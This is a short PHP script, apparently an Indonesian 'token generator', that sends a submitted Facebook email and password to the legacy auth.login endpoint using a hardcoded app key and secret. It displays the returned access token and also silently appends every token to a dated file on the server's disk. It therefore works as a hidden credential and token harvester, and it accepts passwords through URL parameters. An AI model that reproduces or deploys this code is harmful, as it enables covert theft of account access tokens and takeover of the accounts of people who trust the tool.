<?php
$jk = array("	"," ","\n","\r","%09");
$gn = array("","","","","");
if($_GET) $_POST = $_GET;
function sign_creator(&$data){
	$sig = "";
	foreach($data as $key => $value){
		$sig .= "$key=$value";
	}
	$sig .= 'c1e620fa708a1d5696fb991c1bde5662';
	$sig = md5($sig);
	return $data['sig'] = $sig;
}
$data = array(
	"api_key" => "3e7c78e35a76a9299309885393b02d97",
	"email" => str_replace($jk,$gn,$_POST['u']),
	"format" => "JSON",
	//"generate_machine_id" => "1",
	//"generate_session_cookies" => "1",
	"locale" => "id_ID",
	"method" => "auth.login",
	"password" => $_POST['p'],
	"return_ssl_resources" => "0"
	//"callbackURL" => "https://preker.family/Token/token.php"
	//"v" => "1.0"
);
sign_creator($data);
$tk = 'https://graph.facebook.com/restserver.php?'.http_build_query($data);
$tok = file_get_contents($tk);
$parts = explode('"access_token":"', $tok);
$data[$parts[0]] = isset($parts[1]) ? $parts[1] : null;
//cho $tok;
//echo '<iframe width="100%" height="100%" src="'.$tk.'" rows="4"></iframe>';
//echo '<label for="url">URL Kanggo Njukok Token:</label>';
$savetoken = 'D:/token-'.date('y-m-d').'.txt';
$berkas =fopen($savetoken,"a");
if($data[$parts[0]]){
$token = explode('","', $parts[1]);
fputs($berkas, $token[0] . "\n");
fclose($berkas);
}else{
$ambil_e = explode('"error_msg":"', $tok);
$token = explode('","', $ambil_e[1]);
}
echo '<input type="text" id="access_token" onClick="this.select()" placeholder="Isi Token / Generet Token Access" value="'.$token[0].'" class="form-control" style="background:#000;color:#0F0;border-bottom:1px solid #F00;border-right:1px solid #F00;border-top:1px solid #F00;border-left:1px solid #F00;" autocomplete="off"/>';
